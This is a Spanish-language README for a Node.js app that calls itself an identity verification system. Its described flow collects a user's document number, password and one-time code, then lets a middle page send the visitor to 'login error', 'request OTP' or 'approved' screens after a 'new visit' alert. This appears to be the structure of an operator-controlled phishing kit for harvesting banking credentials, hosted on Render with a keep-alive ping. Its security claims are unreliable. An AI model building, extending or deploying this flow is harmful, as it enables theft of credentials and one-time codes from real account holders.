# 🔐 Sistema de Verificación de Identidad

Servidor Node.js profesional para verificación de identidad con flujo completo de autenticación.

## 🚀 Características

✅ **Auto-ping automático** - El servidor se mantiene activo en Render  
✅ **Flujo completo** - index → index2 → otp → loader → aprobado  
✅ **Modals profesionales** - Para mostrar errores y notificaciones  
✅ **Botones interactivos** - Desaparecen al presionarse  
✅ **localStorage** - Guarda datos del usuario  
✅ **Diseño responsivo** - Se adapta a cualquier dispositivo  
✅ **Emojis integrados** - Interfaz amigable y profesional  

## 📋 Estructura del Proyecto

```
optime/
├── server.js           # Servidor Express principal
├── package.json        # Dependencias del proyecto
├── .gitignore         # Archivos a ignorar en git
└── public/
    ├── index.html      # Página de inicio (Documento + Clave)
    ├── index.js        # Lógica para index.html
    ├── index2.html     # Página de verificación (Botones: Error, Aprobado, OTP)
    ├── index2.js       # Lógica para index2.html
    ├── otp.html        # Página de OTP (Documento + Clave + OTP)
    ├── otp.js          # Lógica para otp.html
    ├── loader.html     # Página de espera
    ├── loader.js       # Lógica para loader.html
    ├── aprobado.html   # Página de éxito final
    ├── aprobado.js     # Lógica para aprobado.html
    └── styles.css      # Estilos profesionales
```

## 🔑 IDs e Inputs Utilizados

### index.html
- `inputDocumento` - Input para documento
- `inputClave` - Input para clave
- `btnEnviar` - Botón para enviar

### index2.html
- `displayDocumento` - Mostrar documento
- `displayClave` - Mostrar clave
- `btnError` - Botón error logo
- `btnAprobado` - Botón aprobado
- `btnOtp` - Botón pedir OTP
- `modalError` - Modal de error

### otp.html
- `displayDocumentoOtp` - Mostrar documento
- `displayClaveOtp` - Mostrar clave
- `inputOtp` - Input para OTP
- `btnErrorLogo2` - Botón error logo
- `btnAprobado2` - Botón aprobado
- `btnErrorOtp` - Botón error OTP
- `modalErrorOtp1` - Modal error datos
- `modalErrorOtpIncorrecto` - Modal error OTP

### loader.html
- Spinner automático

### aprobado.html
- `docFinal` - Mostrar documento final
- `estadoFinal` - Mostrar estado
- `btnNuevaVerificacion` - Botón para nueva verificación

## 💾 localStorage

Los datos se guardan en localStorage:
- `documento` - Número de documento
- `clave` - Contraseña
- `otp` - Código OTP (si aplica)
- `estado` - Estado actual (aprobado, otp, etc)

## 🔧 Instalación y Uso

### Local

1. **Instalar dependencias:**
```bash
npm install
```

2. **Ejecutar servidor:**
```bash
npm start
```

3. **Acceder a la aplicación:**
```
http://localhost:3000
```

### En Render

1. Crear nuevo servicio en Render
2. Conectar tu repositorio de GitHub
3. Build command: `npm install`
4. Start command: `npm start`
5. El servidor se mantiene activo automáticamente con el auto-ping cada 30 segundos

## 📊 Flujo de la Aplicación

```
[index.html] → Guarda datos en localStorage → Modal "Nueva Visita" 
    ↓ (2 segundos)
[index2.html] → Muestra datos → 3 opciones:
    ├─ ❌ Error Logo → Modal error → Vuelve a index.html
    ├─ ✅ Aprobado → Vuelve a loader.html
    └─ 📱 Pedir OTP → Va a otp.html
    
[otp.html] → Muestra datos + input OTP → 3 opciones:
    ├─ ❌ Error Logo → Modal error → Vuelve a index.html
    ├─ ✅ Aprobado → Vuelve a loader.html
    └─ ⚠️ Error OTP → Modal error OTP → Intenta de nuevo
    
[loader.html] → Espera 3-5 segundos
    ↓
[aprobado.html] → Muestra datos finales → Nueva verificación
```

## ⚙️ Auto-ping (Render)

El servidor incluye un `setInterval` que envía un ping cada 30 segundos para mantener la aplicación activa en Render.

```javascript
setInterval(() => {
  console.log('✅ Auto-ping - Servidor activo:', new Date().toLocaleTimeString());
}, 30000);
```

## 🎨 Colores y Diseño

- **Gradiente principal:** Morado (#667eea) a Violeta (#764ba2)
- **Éxito:** Verde (#11998e) a Turquesa (#38ef7d)
- **Error:** Rojo (#eb3349) a Naranja (#f45c43)
- **Info:** Azul (#4facfe) a Cian (#00f2fe)
- **Advertencia:** Rosa (#fa709a) a Amarillo (#fee140)

## 📱 Responsivo

La aplicación se adapta perfectamente a:
- 📱 Dispositivos móviles (320px y superiores)
- 📱 Tablets (768px y superiores)
- 💻 Escritorio (1024px y superiores)

## 🔒 Seguridad

- Los datos se guardan localmente en el navegador
- No se transmite información sensible sin validar
- Los inputs se validan antes de procesar

## 📞 Soporte

Para reportar problemas o sugerencias, contacta al equipo de desarrollo.

---

**Creado con ❤️ para una verificación de identidad profesional y segura.**
